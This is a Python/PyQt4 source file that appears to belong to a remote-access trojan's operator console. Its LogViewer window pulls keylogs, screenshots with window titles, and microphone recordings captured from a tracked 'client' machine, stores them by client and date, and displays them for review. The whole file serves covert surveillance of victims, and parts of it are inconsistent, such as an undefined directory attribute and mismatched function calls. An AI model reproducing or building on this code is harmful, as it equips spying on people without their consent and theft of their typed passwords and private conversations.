from ui.log_viewer import Ui_Form as logViewerUi
from PyQt4.QtGui import *
from PyQt4.QtCore import *



import os

from libs.wav_factory import spectrum_analyzer_image, audio_duration
from libs.language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class LogViewer(QWidget, logViewerUi):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.moderator = args['moderator']
        self.moderat = args['moderat']
        self.client_id = args['key']
        self.client_alias = args['alias']
        self.client_ip_address = args['ip_address']
        self.client_os = args['os']
        self.session_id = args['session_id']
        self.module_id = args['module_id']

        self.plots = {}

        # resize audio.spectrum column
        self.audioTable.setColumnWidth(1, 570)

        self.date = str(self.timeCalendar.selectedDate().toPyDate())

        # update gui
        self.gui = QApplication.processEvents

        self.screenshots_dict = {}
        self.keylogs_dict = {}
        self.audio_dict = {}

        # Triggers
        self.timeCalendar.clicked.connect(self.check_data_counts)
        self.downloadButton.clicked.connect(self.download_logs)

        self.screenshotsTable.doubleClicked.connect(self.open_screenshot)
        self.keylogsTable.doubleClicked.connect(self.open_keylog)
        self.audioTable.doubleClicked.connect(self.open_audio)
        self.screenshotsEnableButton.clicked.connect(self.screenshot_button_checked)
        self.keylogsEnableButton.clicked.connect(self.keylogs_button_checked)
        self.audioEnableButton.clicked.connect(self.audio_button_checked)

        # Init
        self.init_ui()
        self.set_language()
        self.check_data_counts()

    def signal(self, data):
        self.callback(data)

    def init_ui(self):
        self.clientIdLine.setText(self.client_id)
        self.clientAliasLine.setText(self.client_alias)
        self.clientIpLine.setText(self.client_ip_address)
        self.clientOsLine.setText(self.client_os)

        # Hide Progress Bar
        self.downloadProgress.setHidden(True)
        self.downloadedLabel.setHidden(True)

        # Hide Path Columns
        self.screenshotsTable.setColumnHidden(2, True)
        self.keylogsTable.setColumnHidden(2, True)
        self.audioTable.setColumnHidden(3, True)

    def set_language(self):
        self.setWindowTitle(_('VIEWER_WINDOW_TITLE'))
        self.logsTab.setTabText(0, _('VIEWER_SCREENSHOTS_TAB'))
        self.logsTab.setTabText(1, _('VIEWER_KEYLOGS_TAB'))
        self.logsTab.setTabText(2, _('VIEWER_AUDIO_TAB'))
        self.screenshotsTable.horizontalHeaderItem(0).setText(_('VIEWER_SCREENSHOT_PREVIEW'))
        self.screenshotsTable.horizontalHeaderItem(1).setText(_('VIEWER_SCREENSHOT_INFO'))
        self.keylogsTable.horizontalHeaderItem(0).setText(_('VIEWER_KEYLOGS_DATETIME'))
        self.keylogsTable.horizontalHeaderItem(1).setText(_('VIEWER_KEYLOGS_INFO'))
        self.audioTable.horizontalHeaderItem(0).setText(_('VIEWER_AUDIO_DURATION'))
        self.audioTable.horizontalHeaderItem(1).setText(_('VIEWER_AUDIO_SPECTRUM'))
        self.audioTable.horizontalHeaderItem(2).setText(_('VIEWER_AUDIO_DATETIME'))
        self.clientInformationGroup.setTitle(_('VIEWER_CLIENT_GROUP_TITLE'))
        self.clientIdLabel.setText(_('VIEWER_CLIENT_ID'))
        self.clientAliasLabel.setText(_('VIEWER_CLIENT_ALIAS'))
        self.clientIpLabel.setText(_('VIEWER_CLIENT_IP'))
        self.clientOsLabel.setText(_('VIEWER_CLIENT_OS'))
        self.downloadGroup.setTitle(_('VIEWER_DOWNLOAD_GROUP_TITLE'))
        self.ignoreViewedCheck.setText(_('VIEWER_IGNOR_VIEWED'))
        self.downloadButton.setText(_('VIEWER_DOWNLOAD'))

    def screenshot_button_checked(self):
        '''
        :return: Download Screenshots Button is Checked
        '''
        if self.screenshotsEnableButton.isChecked():
            self.keylogsEnableButton.setChecked(False)
            self.audioEnableButton.setChecked(False)

    def keylogs_button_checked(self):
        '''
        :return: Download Keylogs Button is Checked
        '''
        if self.keylogsEnableButton.isChecked():
            self.screenshotsEnableButton.setChecked(False)
            self.audioEnableButton.setChecked(False)

    def audio_button_checked(self):
        '''
        :return: Download Audio Button is Checked
        '''
        if self.audioEnableButton.isChecked():
            self.screenshotsEnableButton.setChecked(False)
            self.keylogsEnableButton.setChecked(False)

    def check_data_counts(self):
        '''
        Send Count Logs Signal
        :return:
        '''
        self.update_date()
        self.moderator.send_msg('%s %s' % (self.client_id, self.date), 'countData', session_id=self.session_id, module_id=self.module_id)
        self.callback = self.recv_data_counts

    def recv_data_counts(self, data):
        '''
        Receive Count Logs
        @:type data: dict
        :param data: received data
        :return: Set Count in Labels
        '''
        counted_logs = data['payload']
        self.screenshotsCountNewLabel.setText(str(counted_logs['screenshots']['new']))
        self.screenshotsCountOldLabel.setText(str(counted_logs['screenshots']['old']))
        self.keylogsCountNewLabel.setText(str(counted_logs['keylogs']['new']))
        self.keylogsCountOldLabel.setText(str(counted_logs['keylogs']['old']))
        self.audioCountNewLabel.setText(str(counted_logs['audio']['new']))
        self.audioCountOldLabel.setText(str(counted_logs['audio']['old']))

    def update_date(self):
        '''
        :return: Update Global Date Variable
        '''
        self.date = str(self.timeCalendar.selectedDate().toPyDate())

    def open_screenshot(self):
        '''
        :return: Open Screenshot In System Default Image Viewer
        '''
        current_screenshot_path = str(self.screenshotsTable.item(self.screenshotsTable.currentRow(), 2).text())
        os.startfile(current_screenshot_path)

    def open_keylog(self):
        '''
        :return: Open Keylogs In System Default Browser
        '''
        current_keylog_path = str(self.keylogsTable.item(self.keylogsTable.currentRow(), 2).text())
        os.startfile(current_keylog_path)

    def open_audio(self):
        '''
        :return: Open Audio In System Default Audio Player
        '''
        current_audio_path = str(self.audioTable.item(self.audioTable.currentRow(), 3).text())
        os.startfile(current_audio_path)


    def download_logs(self):
        self.update_date()
        download_info = {
            'filter': self.ignoreViewedCheck.isChecked(),
            'client_id': self.client_id,
            'date': self.date,
        }
        # Init Dirs
        self.screenshots_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'SCREENSHOTS')
        self.keylogs_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'KEYLOGS')
        self.audios_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'AUDIOS')
        self.spectrums_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'AUDIOS')
        if not os.path.exists(self.screenshots_dir):
            os.makedirs(self.screenshots_dir)
        if not os.path.exists(self.keylogs_dir):
            os.makedirs(self.keylogs_dir)
        if not os.path.exists(self.audios_dir):
            os.makedirs(self.audios_dir)

        self.moderator.send_msg(download_info, 'downloadLogs', module_id=self.module_id)
        self.callback = self.recv_download_logs

    def recv_download_logs(self, data):
        self.downloading_screenshots_count = data['payload']['screenshots']
        self.downloaded_screenshots = 0
        self.downloading_keylogs_count = data['payload']['keylogs']
        self.downloaded_keylogs = 0
        self.downloading_audios_count = data['payload']['audios']
        self.downloaded_audios = 0
        # Prepar Progress Bar
        self.downloadProgress.setHidden(False)
        self.downloadedLabel.setHidden(False)
        self.callback = self.recv_log

    def recv_log(self, data):
        type = data['payload']['type']
        if type == 'screenshot':
            self.downloaded_screenshots += 1
            self.downloadProgress.setValue(self.downloaded_screenshots*100/self.downloading_screenshots_count)
            self.downloadedLabel.setText('Downloaded {screenshot} Screenshots From {screenshots}'.format(
                screenshot=self.downloaded_screenshots,
                screenshots=self.downloading_screenshots_count
            ))

            self.screenshotsTable.setRowCount(self.downloading_screenshots_count)

            # Generate File
            path = os.path.join(self.screenshots_dir, data['payload']['datetime']+'.png')
            if not os.path.exists(path):
                with open(path, 'wb') as screenshot_file:
                    screenshot_file.write(data['payload']['raw'])

            # add screenshot preview
            image = QImage(path)
            pixmap = QPixmap.fromImage(image)
            previews_dict = QLabel()
            previews_dict.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio))
            previews_dict.setScaledContents(True)
            self.screenshotsTable.setCellWidget(self.downloaded_screenshots-1, 0, previews_dict)

            # add screenshot information
            payload = '''
            <p align="center"><font color="#e67e22">%s</font></p>
            %s
            ''' % (data['payload']['datetime'], data['payload']['window_title'])
            infoText = QTextEdit()
            infoText.setReadOnly(True)
            infoText.setStyleSheet('background: #2c3e50;\nborder: 1px ridge;\nborder-color: #2c3e50;\nborder-top: none;\npadding: 3px;')
            infoText.insertHtml(payload)
            self.screenshotsTable.setCellWidget(self.downloaded_screenshots-1, 1, infoText)

            # add path
            item = QTableWidgetItem(path)
            self.screenshotsTable.setItem(self.downloaded_screenshots-1, 2, item)

        elif type == 'keylog':
            self.downloaded_keylogs += 1
            self.downloadProgress.setValue(self.downloaded_keylogs*100/self.downloading_keylogs_count)
            self.downloadedLabel.setText('Downloaded {keylog} Keylog From {keylogs}'.format(
                keylog=self.downloaded_keylogs,
                keylogs=self.downloading_keylogs_count
            ))

            # Generate File
            path = os.path.join(self.keylogs_dir, data['payload']['datetime']+'.html')
            if not os.path.exists(path):
                with open(path, 'wb') as screenshot_file:
                    screenshot_file.write(data['payload']['raw'])

            self.keylogsTable.setRowCount(self.downloading_keylogs_count)
            # Add Data
            item = QTableWidgetItem(data['payload']['datetime'])
            item.setTextColor(QColor('#f39c12'))
            self.keylogsTable.setItem(self.downloaded_keylogs-1, 0, item)

            # Add Preview
            keylog_preview = open(path, 'r').readline()
            item = QTableWidgetItem(keylog_preview)
            self.keylogsTable.setItem(self.downloaded_keylogs-1, 1, item)

            # Add Path
            item = QTableWidgetItem(path)
            self.keylogsTable.setItem(self.downloaded_keylogs-1, 2, item)

        elif type == 'audio':
            self.downloaded_audios += 1
            self.downloadProgress.setValue(self.downloaded_audios*100/self.downloading_audios_count)
            self.downloadedLabel.setText('Downloaded {audio} Audio From {audios}'.format(
                audio=self.downloaded_audios,
                audios=self.downloading_audios_count
            ))

            # Generate File
            path = os.path.join(self.audios_dir, data['payload']['datetime']+'.wav')
            if not os.path.exists(path):
                with open(path, 'wb') as audio_file:
                    audio_file.write(data['payload']['raw'])

            self.audioTable.setRowCount(self.downloading_audios_count)

            # Add Audio Duration
            item = QTableWidgetItem(audio_duration(path))
            item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
            item.setTextColor(QColor('#16a085'))
            self.audioTable.setItem(self.downloaded_audios-1, 0, item)

            # Add Spectrum
            generated_spectrum = spectrum_analyzer_image(path, data['payload']['datetime'], self.spectrums_dir)
            image = QImage(generated_spectrum)
            pixmap = QPixmap.fromImage(image)
            spectrum_image = QLabel()
            spectrum_image.setStyleSheet('background: none;')
            spectrum_image.setPixmap(pixmap)
            self.audioTable.setCellWidget(self.downloaded_audios-1, 1, spectrum_image)

            # add date time
            item = QTableWidgetItem(data['payload']['datetime'])
            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
            item.setTextColor(QColor('#f39c12'))
            self.audioTable.setItem(self.downloaded_audios-1, 2, item)

            # add path
            item = QTableWidgetItem(path)
            self.audioTable.setItem(self.downloaded_audios-1, 3, item)

        else:
            # Prepar Progress Bar
            self.downloadProgress.setHidden(True)
            self.downloadedLabel.setHidden(True)
            self.downloaded_screenshots = 0
            self.downloaded_keylogs = 0
            self.downloaded_audios = 0

    def update_tables(self, tab_index):

        self.logsTab.setCurrentIndex(tab_index)

        if len(self.screenshots_dict) > 0:
            self.screenshotsTable.setRowCount(len(self.screenshots_dict))
            self.screenshotsTable.setColumnWidth(0, 180)
            for index, key in enumerate(self.screenshots_dict):
                self.gui()

                # add screenshot preview
                im = self.screenshots_dict[key]['path']
                image = QImage(im)
                pixmap = QPixmap.fromImage(image)
                previews_dict = QLabel()
                previews_dict.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio))
                previews_dict.setScaledContents(True)
                self.screenshotsTable.setCellWidget(index, 0, previews_dict)

                # add screenshot information
                payload = '''
                <p align="center"><font color="#e67e22">%s</font></p>
                %s
                ''' % (self.screenshots_dict[key]['datetime'], self.screenshots_dict[key]['window_title'])
                infoText = QTextEdit()
                infoText.setReadOnly(True)
                infoText.setStyleSheet('background: #2c3e50;\nborder: 1px ridge;\nborder-color: #2c3e50;\nborder-top: none;\npadding: 3px;')
                infoText.insertHtml(payload)
                self.screenshotsTable.setCellWidget(index, 1, infoText)

                # add path
                item = QTableWidgetItem(self.screenshots_dict[key]['path'])
                self.screenshotsTable.setItem(index, 2, item)

        if len(self.keylogs_dict) > 0:
            self.keylogsTable.setRowCount(len(self.keylogs_dict))
            for index, key in enumerate(self.keylogs_dict):
                self.gui()

                # add date
                item = QTableWidgetItem(self.keylogs_dict[key]['datetime'])
                item.setTextColor(QColor('#f39c12'))
                self.keylogsTable.setItem(index, 0, item)

                # add log preview
                log = open(self.keylogs_dict[key]['path'], 'r').readline()
                html_snippets = ['<p align="center" style="background-color: #34495e;color: #ecf0f1;">',
                                '<br>',
                                '<font color="#e67e22">',
                                '</font>',
                                '</p>']
                for i in html_snippets:
                    log = log.replace(i, '')
                item = QTableWidgetItem(log.decode('utf-8'))
                self.keylogsTable.setItem(index, 1, item)

                # add path
                item = QTableWidgetItem(self.keylogs_dict[key]['path'])
                self.keylogsTable.setItem(index, 2, item)

        if len(self.audio_dict) > 0:
            self.audioTable.setRowCount(len(self.audio_dict))
            for index, key in enumerate(self.audio_dict):
                self.gui()

                # add audio duration
                item = QTableWidgetItem(audio_duration(self.audio_dict[key]['path']))
                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
                item.setTextColor(QColor('#16a085'))
                self.audioTable.setItem(index, 0, item)

                # add screenshot preview
                generated_spectrum = spectrum_analyzer_image(self.client_id,
                                                             self.audio_dict[key]['path'],
                                                             self.audio_dict[key]['datetime'],
                                                             self.selected_dir)
                image = QImage(generated_spectrum)
                pixmap = QPixmap.fromImage(image)
                spectrum_image = QLabel()
                spectrum_image.setStyleSheet('background: none;')
                spectrum_image.setPixmap(pixmap)
                self.audioTable.setCellWidget(index, 1, spectrum_image)

                # add date time
                item = QTableWidgetItem(self.audio_dict[key]['datetime'])
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                item.setTextColor(QColor('#f39c12'))
                self.audioTable.setItem(index, 2, item)

                # add path
                item = QTableWidgetItem(self.audio_dict[key]['path'])
                self.audioTable.setItem(index, 3, item)